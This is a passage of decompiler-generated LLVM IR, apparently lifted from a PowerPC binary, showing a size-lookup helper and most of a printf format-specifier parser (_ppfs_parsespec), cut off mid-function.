  uselistorder i32 %v3_1000d9a0, { 1, 0, 2 }
  uselistorder i32 %v1_1000d9a4, { 1, 0 }
  uselistorder i32 %v3_1000d970, { 1, 0, 2 }
  uselistorder i32 %v1_1000d96c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000d970, { 0, 2, 1 }
  uselistorder i32 %v4_1000d8e8, { 1, 0, 2 }
  uselistorder i32 %v1_1000d8a8, { 1, 0 }
  uselistorder i32 %v1_1000d8a0, { 2, 0, 1 }
  uselistorder i32 %v1_1000d84c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000d840, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000d838, { 1, 0 }
  uselistorder i32 %v2_1000d94c, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000d9705, { 1, 0, 2 }
  uselistorder i32 %v3_1000d7e0, { 1, 0, 2 }
  uselistorder i32 %v2_1000d810, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000d788, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000d780, { 1, 0, 2 }
  uselistorder i32 %v0_1000d780, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 18, 19, 8, 9, 10, 11, 0, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_1000d9c0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d9a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d96c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d968, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d960, { 1, 0 }
  uselistorder label %dec_label_pc_1000d930, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000d8e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d838, { 1, 0 }
  uselistorder label %dec_label_pc_1000d970.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000d824, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7d4, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000d9fc

dec_label_pc_1000d9fc:                            ; preds = %dec_label_pc_1000d9fc, %entry
  %v0_1000d9fc = phi i32 [ ptrtoint (i32* @global_var_10016bfc.604 to i32), %entry ], [ %v1_1000d9fc, %dec_label_pc_1000d9fc ]
  %v1_1000d9fc = add i32 %v0_1000d9fc, -2
  %v2_1000d9fc = inttoptr i32 %v1_1000d9fc to i16*
  %v3_1000d9fc = load i16, i16* %v2_1000d9fc, align 2
  %v4_1000d9fc = sext i16 %v3_1000d9fc to i32
  %v4_1000da00 = icmp eq i32 %v4_1000d9fc, %arg1
  %v3_1000da04.not = icmp ule i32 %v1_1000d9fc, ptrtoint (i32* @global_var_10016be4.605 to i32)
  %brmerge = or i1 %v4_1000da00, %v3_1000da04.not
  br i1 %brmerge, label %dec_label_pc_1000da10, label %dec_label_pc_1000d9fc

dec_label_pc_1000da10:                            ; preds = %dec_label_pc_1000d9fc
  %v2_1000da18 = sub i32 %v1_1000d9fc, ptrtoint (i32* @global_var_10016be4.605 to i32)
  %v1_1000da20 = udiv i32 %v2_1000da18, 2
  %v2_1000da20 = and i32 %v2_1000da18, -2147483648
  %v3_1000da20 = or i32 %v1_1000da20, %v2_1000da20
  %v2_1000da28 = add i32 %v3_1000da20, ptrtoint (i32* @global_var_10016bfc.604 to i32)
  %v3_1000da28 = inttoptr i32 %v2_1000da28 to i8*
  %v4_1000da28 = load i8, i8* %v3_1000da28, align 1
  %v5_1000da28 = zext i8 %v4_1000da28 to i32
  ret i32 %v5_1000da28

; uselistorder directives
  uselistorder i32 %v2_1000da18, { 1, 0 }
  uselistorder i32 %v1_1000d9fc, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10016be4.605 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10016bfc.604 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000da30 = load i32, i32* @lr, align 4
  store i32 %v0_1000da30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000da48 = add i32 %tmp, 16
  %v2_1000da48 = inttoptr i32 %v1_1000da48 to i32*
  %v3_1000da48 = load i32, i32* %v2_1000da48, align 4
  %v1_1000da50 = and i32 %v3_1000da48, 128
  store i32 %v1_1000da50, i32* %r6.global-to-local, align 4
  %v3_1000da50 = icmp eq i32 %v1_1000da50, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000da64 = add i32 %tmp, 24
  %v2_1000da64 = inttoptr i32 %v1_1000da64 to i32*
  %v3_1000da64 = load i32, i32* %v2_1000da64, align 4
  store i32 %v3_1000da64, i32* @r26, align 4
  br i1 %v3_1000da50, label %dec_label_pc_1000da6c, label %dec_label_pc_1000da84

dec_label_pc_1000da6c:                            ; preds = %entry
  %v2_1000da6c = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000dad8

dec_label_pc_1000da7c:                            ; preds = %dec_label_pc_1000dcac
  %v1_1000da7c = add i32 %v0_1000dc7c, 1
  store i32 %v1_1000da7c, i32* @r30, align 4
  br label %dec_label_pc_1000dcc4

dec_label_pc_1000da84:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000da88 = load i32, i32* %arg1, align 4
  store i32 %v2_1000da88, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000da94 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000da94, i32* @r7, align 4
  br label %dec_label_pc_1000da98

dec_label_pc_1000da98:                            ; preds = %dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge, %dec_label_pc_1000da84
  %v0_1000daa0 = phi i32 [ %v0_1000daa0.pre, %dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge ], [ %v2_1000da88, %dec_label_pc_1000da84 ]
  %v0_1000da9c = phi i32 [ %v0_1000da9c.pre, %dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge ], [ %v2_1000da94, %dec_label_pc_1000da84 ]
  %v0_1000daa4 = phi i32 [ %v0_1000da98.pre, %dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge ], [ 0, %dec_label_pc_1000da84 ]
  %v1_1000da98 = mul i32 %v0_1000daa4, 4
  %v2_1000da9c = add i32 %v0_1000daa4, %v0_1000da9c
  store i32 %v2_1000da9c, i32* %r9.global-to-local, align 4
  %v2_1000daa0 = add i32 %v1_1000da98, %v0_1000daa0
  store i32 %v2_1000daa0, i32* %r11.global-to-local, align 4
  %v1_1000daa4 = add i32 %v0_1000daa4, 1
  store i32 %v1_1000daa4, i32* %r10.global-to-local, align 4
  %v1_1000daa8 = add i32 %v2_1000daa0, -4
  %v2_1000daa8 = inttoptr i32 %v1_1000daa8 to i32*
  %v3_1000daa8 = load i32, i32* %v2_1000daa8, align 4
  store i32 %v3_1000daa8, i32* %r0.global-to-local, align 4
  %v1_1000daac = trunc i32 %v3_1000daa8 to i8
  %v3_1000daac = add i32 %v2_1000da9c, 24
  %v4_1000daac = inttoptr i32 %v3_1000daac to i8*
  store i8 %v1_1000daac, i8* %v4_1000daac, align 1
  %v0_1000dab0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dab0 = urem i32 %v0_1000dab0, 256
  store i32 %v1_1000dab0, i32* %r0.global-to-local, align 4
  %v0_1000dab8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dab8 = add i32 %v0_1000dab8, -4
  %v2_1000dab8 = inttoptr i32 %v1_1000dab8 to i32*
  %v3_1000dab8 = load i32, i32* %v2_1000dab8, align 4
  store i32 %v3_1000dab8, i32* %r9.global-to-local, align 4
  %v4_1000dabc = icmp eq i32 %v1_1000dab0, %v3_1000dab8
  br i1 %v4_1000dabc, label %dec_label_pc_1000dac4, label %dec_label_pc_1000df34

dec_label_pc_1000dac4:                            ; preds = %dec_label_pc_1000da98
  %v3_1000dab4 = icmp eq i32 %v1_1000dab0, 0
  br i1 %v3_1000dab4, label %dec_label_pc_1000dacc, label %dec_label_pc_1000dac8

dec_label_pc_1000dac8:                            ; preds = %dec_label_pc_1000dac4
  %v0_1000dac8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dac8 = add i32 %v0_1000dac8, -1
  store i32 %v1_1000dac8, i32* %ctr.global-to-local, align 4
  %v2_1000dac8 = icmp eq i32 %v1_1000dac8, 0
  br i1 %v2_1000dac8, label %dec_label_pc_1000dacc, label %dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge

dec_label_pc_1000dac8.dec_label_pc_1000da98_crit_edge: ; preds = %dec_label_pc_1000dac8
  %v0_1000da98.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000da9c.pre = load i32, i32* @r7, align 4
  %v0_1000daa0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000da98

dec_label_pc_1000dacc:                            ; preds = %dec_label_pc_1000dac8, %dec_label_pc_1000dac4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000dad0 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000dad8

dec_label_pc_1000dad8:                            ; preds = %dec_label_pc_1000da6c, %dec_label_pc_1000dacc
  %v2_1000dae8.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000da6c ], [ %v2_1000da94, %dec_label_pc_1000dacc ]
  %storemerge3 = phi i32 [ %v2_1000da6c, %dec_label_pc_1000da6c ], [ %v2_1000dad0, %dec_label_pc_1000dacc ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268500992, i32* @r27, align 4
  store i32 %v2_1000dae8.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268632064, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000daf8

dec_label_pc_1000daf4:                            ; preds = %dec_label_pc_1000dc04, %dec_label_pc_1000dc88
  %v0_1000daf4 = phi i32 [ %v1_1000dc88, %dec_label_pc_1000dc88 ], [ %v0_1000dbec, %dec_label_pc_1000dc04 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000dc88 ], [ %stack_var_-84.2, %dec_label_pc_1000dc04 ]
  store i32 %v0_1000daf4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000daf8

dec_label_pc_1000daf8:                            ; preds = %dec_label_pc_1000dad8, %dec_label_pc_1000daf4
  %v0_1000db0c = phi i32 [ %storemerge3, %dec_label_pc_1000dad8 ], [ %v0_1000daf4, %dec_label_pc_1000daf4 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000dad8 ], [ %stack_var_-84.0, %dec_label_pc_1000daf4 ]
  %v1_1000daf8 = inttoptr i32 %v0_1000db0c to i8*
  %v2_1000daf8 = load i8, i8* %v1_1000daf8, align 1
  %v3_1000daf8 = zext i8 %v2_1000daf8 to i32
  store i32 %v3_1000daf8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000db0c, i32* @r30, align 4
  %v3_1000db00 = icmp eq i8 %v2_1000daf8, 42
  br i1 %v3_1000db00, label %dec_label_pc_1000db08, label %dec_label_pc_1000db18

dec_label_pc_1000db08:                            ; preds = %dec_label_pc_1000daf8
  %v0_1000db08 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000db08 = mul i32 %v0_1000db08, -4
  store i32 %v1_1000db08, i32* %r0.global-to-local, align 4
  %v1_1000db0c = add i32 %v0_1000db0c, 1
  store i32 %v1_1000db0c, i32* @r30, align 4
  %v0_1000db10 = load i32, i32* @r1, align 4
  %v2_1000db10 = add i32 %v0_1000db10, %v1_1000db08
  store i32 %v2_1000db10, i32* %r9.global-to-local, align 4
  %v0_1000db14 = load i32, i32* @r29, align 4
  %v2_1000db14 = add i32 %v2_1000db10, 8
  %v3_1000db14 = inttoptr i32 %v2_1000db14 to i32*
  store i32 %v0_1000db14, i32* %v3_1000db14, align 4
  %v0_1000db30.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000db18

dec_label_pc_1000db18:                            ; preds = %dec_label_pc_1000daf8, %dec_label_pc_1000db08
  %v0_1000db30.pre = phi i32 [ %v0_1000db0c, %dec_label_pc_1000daf8 ], [ %v0_1000db30.pre.pre, %dec_label_pc_1000db08 ]
  %v3_1000db18 = load i32, i32* @global_var_10028578, align 4
  store i32 %v3_1000db18, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000db30

dec_label_pc_1000db24:                            ; preds = %dec_label_pc_1000db30
  %v2_1000db34 = icmp sgt i32 %v0_1000db7c, 4094
  br i1 %v2_1000db34, label %dec_label_pc_1000db2c, label %dec_label_pc_1000db28

dec_label_pc_1000db28:                            ; preds = %dec_label_pc_1000db24
  %v1_1000db28 = add i32 %v2_1000db48, -48
  store i32 %v1_1000db28, i32* @r8, align 4
  br label %dec_label_pc_1000db2c

dec_label_pc_1000db2c:                            ; preds = %dec_label_pc_1000db24, %dec_label_pc_1000db28
  %v0_1000db3415 = phi i32 [ %v0_1000db7c, %dec_label_pc_1000db24 ], [ %v1_1000db28, %dec_label_pc_1000db28 ]
  %v1_1000db2c = add i32 %v0_1000dbac, 1
  store i32 %v1_1000db2c, i32* @r30, align 4
  br label %dec_label_pc_1000db30

dec_label_pc_1000db30:                            ; preds = %dec_label_pc_1000db18, %dec_label_pc_1000db2c
  %v0_1000db7c = phi i32 [ 0, %dec_label_pc_1000db18 ], [ %v0_1000db3415, %dec_label_pc_1000db2c ]
  %v0_1000dbac = phi i32 [ %v0_1000db30.pre, %dec_label_pc_1000db18 ], [ %v1_1000db2c, %dec_label_pc_1000db2c ]
  %v1_1000db30 = inttoptr i32 %v0_1000dbac to i8*
  %v2_1000db30 = load i8, i8* %v1_1000db30, align 1
  %v3_1000db30 = zext i8 %v2_1000db30 to i32
  store i32 %v3_1000db30, i32* %r11.global-to-local, align 4
  %v1_1000db38 = mul nuw nsw i32 %v3_1000db30, 2
  store i32 %v1_1000db38, i32* %r9.global-to-local, align 4
  %v2_1000db3c = add i32 %v1_1000db38, %v3_1000db18
  %v3_1000db3c = inttoptr i32 %v2_1000db3c to i16*
  %v4_1000db3c = load i16, i16* %v3_1000db3c, align 2
  %v5_1000db3c = zext i16 %v4_1000db3c to i32
  store i32 %v5_1000db3c, i32* %r0.global-to-local, align 4
  %v1_1000db40 = mul i32 %v0_1000db7c, 10
  %v1_1000db44 = and i32 %v5_1000db3c, 8
  store i32 %v1_1000db44, i32* @r25, align 4
  %v3_1000db44 = icmp eq i32 %v1_1000db44, 0
  %v2_1000db48 = add i32 %v3_1000db30, %v1_1000db40
  store i32 %v2_1000db48, i32* %r9.global-to-local, align 4
  br i1 %v3_1000db44, label %dec_label_pc_1000db50, label %dec_label_pc_1000db24

dec_label_pc_1000db50:                            ; preds = %dec_label_pc_1000db30
  %v0_1000db50 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000db50 = add i32 %v0_1000db50, -1
  %v2_1000db50 = inttoptr i32 %v1_1000db50 to i8*
  %v3_1000db50 = load i8, i8* %v2_1000db50, align 1
  %v4_1000db50 = zext i8 %v3_1000db50 to i32
  store i32 %v4_1000db50, i32* %r0.global-to-local, align 4
  %v3_1000db54 = icmp eq i8 %v3_1000db50, 37
  br i1 %v3_1000db54, label %dec_label_pc_1000db5c, label %dec_label_pc_1000dc24

dec_label_pc_1000db5c:                            ; preds = %dec_label_pc_1000db50
  %v3_1000db5c = icmp eq i8 %v2_1000db30, 36
  br i1 %v3_1000db5c, label %dec_label_pc_1000db64, label %dec_label_pc_1000db98

dec_label_pc_1000db64:                            ; preds = %dec_label_pc_1000db5c
  %tmp58 = icmp slt i32 %v0_1000db7c, 1
  br i1 %tmp58, label %dec_label_pc_1000db98, label %dec_label_pc_1000db6c

dec_label_pc_1000db6c:                            ; preds = %dec_label_pc_1000db64
  %v0_1000db6c = load i32, i32* @r26, align 4
  %v3_1000db6c = icmp eq i32 %v0_1000db6c, 0
  %v1_1000db70 = add i32 %v0_1000dbac, 1
  store i32 %v1_1000db70, i32* %r10.global-to-local, align 4
  br i1 %v3_1000db6c, label %dec_label_pc_1000df34, label %dec_label_pc_1000db78

dec_label_pc_1000db78:                            ; preds = %dec_label_pc_1000db6c
  %v3_1000db78 = icmp sgt i32 %v0_1000db7c, %v0_1000db6c
  br i1 %v3_1000db78, label %dec_label_pc_1000db84, label %dec_label_pc_1000db90

dec_label_pc_1000db84:                            ; preds = %dec_label_pc_1000db78
  store i32 %v0_1000db7c, i32* @r26, align 4
  br label %dec_label_pc_1000db90

dec_label_pc_1000db8c:                            ; preds = %dec_label_pc_1000dbb4, %dec_label_pc_1000dbac
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000db90

dec_label_pc_1000db90:                            ; preds = %dec_label_pc_1000db78, %dec_label_pc_1000db84, %dec_label_pc_1000db8c
  %v0_1000db90 = phi i32 [ %v0_1000db50, %dec_label_pc_1000db8c ], [ %v1_1000db70, %dec_label_pc_1000db84 ], [ %v1_1000db70, %dec_label_pc_1000db78 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000db8c ], [ %v0_1000db7c, %dec_label_pc_1000db84 ], [ %v0_1000db7c, %dec_label_pc_1000db78 ]
  br label %dec_label_pc_1000dbcc

dec_label_pc_1000db98:                            ; preds = %dec_label_pc_1000db5c, %dec_label_pc_1000db64
  %v0_1000db98 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000db98, 1
  br i1 %tmp59, label %dec_label_pc_1000dbac, label %dec_label_pc_1000dba0

dec_label_pc_1000dba0:                            ; preds = %dec_label_pc_1000db98
  %v3_1000dba0 = icmp eq i8 %v2_1000db30, 109
  br i1 %v3_1000dba0, label %dec_label_pc_1000dc24, label %dec_label_pc_1000df34

dec_label_pc_1000dbac:                            ; preds = %dec_label_pc_1000db98
  %v3_1000dbac = icmp ugt i32 %v0_1000dbac, %v0_1000db50
  br i1 %v3_1000dbac, label %dec_label_pc_1000dbb4, label %dec_label_pc_1000db8c

dec_label_pc_1000dbb4:                            ; preds = %dec_label_pc_1000dbac
  %v1_1000dbb4 = inttoptr i32 %v0_1000db50 to i8*
  %v2_1000dbb4 = load i8, i8* %v1_1000dbb4, align 1
  %v3_1000dbb4 = zext i8 %v2_1000dbb4 to i32
  store i32 %v3_1000dbb4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000db50, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000dbc0 = icmp eq i8 %v2_1000dbb4, 48
  br i1 %v3_1000dbc0, label %dec_label_pc_1000db8c, label %dec_label_pc_1000dc28

dec_label_pc_1000dbcc:                            ; preds = %dec_label_pc_1000dbe8, %dec_label_pc_1000db90
  %v0_1000dbec = phi i32 [ %v0_1000db90, %dec_label_pc_1000db90 ], [ %v1_1000dbec, %dec_label_pc_1000dbe8 ]
  store i32 %v0_1000dbec, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10016bdc.606 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000dbdc = inttoptr i32 %v0_1000dbec to i8*
  br label %dec_label_pc_1000dbd4

dec_label_pc_1000dbd4:                            ; preds = %dec_label_pc_1000dbf4, %dec_label_pc_1000dbcc
  %v1_1000dbe8 = phi i32 [ %v1_1000dbf8, %dec_label_pc_1000dbf4 ], [ 1, %dec_label_pc_1000dbcc ]
  %v0_1000dbd4 = phi i32 [ %v1_1000dbd8, %dec_label_pc_1000dbf4 ], [ ptrtoint ([8 x i8]* @global_var_10016bdc.606 to i32), %dec_label_pc_1000dbcc ]
  %v1_1000dbd4 = inttoptr i32 %v0_1000dbd4 to i8*
  %v2_1000dbd4 = load i8, i8* %v1_1000dbd4, align 1
  %v3_1000dbd4 = zext i8 %v2_1000dbd4 to i32
  store i32 %v3_1000dbd4, i32* %r9.global-to-local, align 4
  %v1_1000dbd8 = add i32 %v0_1000dbd4, 1
  store i32 %v1_1000dbd8, i32* %r11.global-to-local, align 4
  %v2_1000dbdc = load i8, i8* %v1_1000dbdc, align 1
  %v3_1000dbdc = zext i8 %v2_1000dbdc to i32
  store i32 %v3_1000dbdc, i32* %r0.global-to-local, align 4
  %v4_1000dbe0 = icmp eq i8 %v2_1000dbdc, %v2_1000dbd4
  br i1 %v4_1000dbe0, label %dec_label_pc_1000dbe8, label %dec_label_pc_1000dbf4

dec_label_pc_1000dbe8:                            ; preds = %dec_label_pc_1000dbd4
  %v0_1000dbe8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000dbe8 = or i32 %v0_1000dbe8, %v1_1000dbe8
  store i32 %v2_1000dbe8, i32* %r6.global-to-local, align 4
  %v1_1000dbec = add i32 %v0_1000dbec, 1
  br label %dec_label_pc_1000dbcc

dec_label_pc_1000dbf4:                            ; preds = %dec_label_pc_1000dbd4
  %v1_1000dbf4 = inttoptr i32 %v1_1000dbd8 to i8*
  %v2_1000dbf4 = load i8, i8* %v1_1000dbf4, align 1
  %v3_1000dbf4 = zext i8 %v2_1000dbf4 to i32
  store i32 %v3_1000dbf4, i32* %r0.global-to-local, align 4
  %v1_1000dbf8 = mul i32 %v1_1000dbe8, 2
  store i32 %v1_1000dbf8, i32* %r10.global-to-local, align 4
  %v3_1000dbfc = icmp eq i8 %v2_1000dbf4, 0
  br i1 %v3_1000dbfc, label %dec_label_pc_1000dc04, label %dec_label_pc_1000dbd4

dec_label_pc_1000dc04:                            ; preds = %dec_label_pc_1000dbf4
  %v1_1000dc04 = add i32 %v0_1000dbec, -1
  %v2_1000dc04 = inttoptr i32 %v1_1000dc04 to i8*
  %v3_1000dc04 = load i8, i8* %v2_1000dc04, align 1
  %v4_1000dc04 = zext i8 %v3_1000dc04 to i32
  store i32 %v4_1000dc04, i32* %r0.global-to-local, align 4
  %v0_1000dc08 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000dc08 = and i32 %v0_1000dc08, 10
  store i32 0, i32* @r8, align 4
  %v3_1000dc10 = icmp eq i8 %v3_1000dc04, 37
  %v1_1000dc14 = udiv i32 %v1_1000dc08, 2
  store i32 %v1_1000dc14, i32* %r9.global-to-local, align 4
  %v2_1000dc18 = sub nuw nsw i32 -1, %v1_1000dc14
  %v3_1000dc18 = and i32 %v0_1000dc08, %v2_1000dc18
  store i32 %v3_1000dc18, i32* %r6.global-to-local, align 4
  br i1 %v3_1000dc10, label %dec_label_pc_1000dc28, label %dec_label_pc_1000daf4

dec_label_pc_1000dc24:                            ; preds = %dec_label_pc_1000db50, %dec_label_pc_1000dba0
  store i32 %v0_1000db50, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000dc28

dec_label_pc_1000dc28:                            ; preds = %dec_label_pc_1000dbb4, %dec_label_pc_1000dc04, %dec_label_pc_1000dc24
  %v0_1000dc5c = phi i32 [ 0, %dec_label_pc_1000dc04 ], [ %v0_1000db7c, %dec_label_pc_1000dbb4 ], [ %v0_1000db7c, %dec_label_pc_1000dc24 ]
  %v1_1000dc68 = phi i32 [ %v0_1000dbec, %dec_label_pc_1000dc04 ], [ %v0_1000dbac, %dec_label_pc_1000dbb4 ], [ %v0_1000dbac, %dec_label_pc_1000dc24 ]
  %v0_1000dc64 = phi i32 [ %v1_1000dbd8, %dec_label_pc_1000dc04 ], [ %v0_1000db50, %dec_label_pc_1000dbb4 ], [ %v0_1000db50, %dec_label_pc_1000dc24 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000dc04 ], [ %stack_var_-84.1, %dec_label_pc_1000dbb4 ], [ %stack_var_-84.1, %dec_label_pc_1000dc24 ]
  %v1_1000dc28 = inttoptr i32 %v0_1000dc64 to i8*
  %v2_1000dc28 = load i8, i8* %v1_1000dc28, align 1
  %v3_1000dc28 = zext i8 %v2_1000dc28 to i32
  store i32 %v3_1000dc28, i32* %r0.global-to-local, align 4
  %v3_1000dc2c = icmp eq i8 %v2_1000dc28, 42
  br i1 %v3_1000dc2c, label %dec_label_pc_1000dc34, label %dec_label_pc_1000dc74

dec_label_pc_1000dc34:                            ; preds = %dec_label_pc_1000dc28
  %v0_1000dc34 = load i32, i32* @r26, align 4
  %v3_1000dc34 = icmp eq i32 %v0_1000dc34, 0
  br i1 %v3_1000dc34, label %dec_label_pc_1000dc64, label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %dec_label_pc_1000dc34
  %v1_1000dc3c = inttoptr i32 %v1_1000dc68 to i8*
  %v2_1000dc3c = load i8, i8* %v1_1000dc3c, align 1
  %v3_1000dc3c = zext i8 %v2_1000dc3c to i32
  store i32 %v3_1000dc3c, i32* %r0.global-to-local, align 4
  %v3_1000dc40 = icmp eq i8 %v2_1000dc3c, 36
  br i1 %v3_1000dc40, label %dec_label_pc_1000dc48, label %dec_label_pc_1000df34

dec_label_pc_1000dc48:                            ; preds = %dec_label_pc_1000dc3c
  %tmp60 = icmp slt i32 %v0_1000dc5c, 1
  br i1 %tmp60, label %dec_label_pc_1000df34, label %dec_label_pc_1000dc50

dec_label_pc_1000dc50:                            ; preds = %dec_label_pc_1000dc48
  %v0_1000dc50 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000dc50 = mul i32 %v0_1000dc50, -4
  %v1_1000dc54 = add i32 %v1_1000dc68, 1
  store i32 %v1_1000dc54, i32* @r30, align 4
  %v0_1000dc58 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000dc58 = add i32 %v0_1000dc58, %v1_1000dc50
  store i32 %v2_1000dc58, i32* %r9.global-to-local, align 4
  %v2_1000dc5c = add i32 %v2_1000dc58, 12
  %v3_1000dc5c = inttoptr i32 %v2_1000dc5c to i32*
  store i32 %v0_1000dc5c, i32* %v3_1000dc5c, align 4
  %v0_1000dc7c.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dc70

dec_label_pc_1000dc64:                            ; preds = %dec_label_pc_1000dc34
  %v1_1000dc64 = add i32 %v0_1000dc64, 1
  store i32 %v1_1000dc64, i32* %r0.global-to-local, align 4
  %v4_1000dc68 = icmp eq i32 %v1_1000dc64, %v1_1000dc68
  br i1 %v4_1000dc68, label %dec_label_pc_1000dc70, label %dec_label_pc_1000df34

dec_label_pc_1000dc70:                            ; preds = %dec_label_pc_1000dc64, %dec_label_pc_1000dc50
  %v0_1000dc7c.pre = phi i32 [ %v1_1000dc68, %dec_label_pc_1000dc64 ], [ %v0_1000dc7c.pre.pre, %dec_label_pc_1000dc50 ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc74:                            ; preds = %dec_label_pc_1000dc28, %dec_label_pc_1000dc70
  %v0_1000dc7c = phi i32 [ %v1_1000dc68, %dec_label_pc_1000dc28 ], [ %v0_1000dc7c.pre, %dec_label_pc_1000dc70 ]
  %v0_1000dc8c = phi i32 [ %v0_1000dc5c, %dec_label_pc_1000dc28 ], [ -2147483648, %dec_label_pc_1000dc70 ]
  %v0_1000dc74 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000dc74 = icmp eq i32 %v0_1000dc74, 0
  %v1_1000dc7c = inttoptr i32 %v0_1000dc7c to i8*
  br i1 %v3_1000dc74, label %dec_label_pc_1000dc7c, label %dec_label_pc_1000dca0

dec_label_pc_1000dc7c:                            ; preds = %dec_label_pc_1000dc74
  %v2_1000dc7c = load i8, i8* %v1_1000dc7c, align 1
  %v3_1000dc7c = zext i8 %v2_1000dc7c to i32
  store i32 %v3_1000dc7c, i32* %r0.global-to-local, align 4
  %v3_1000dc80 = icmp eq i8 %v2_1000dc7c, 46
  br i1 %v3_1000dc80, label %dec_label_pc_1000dc88, label %dec_label_pc_1000dc98

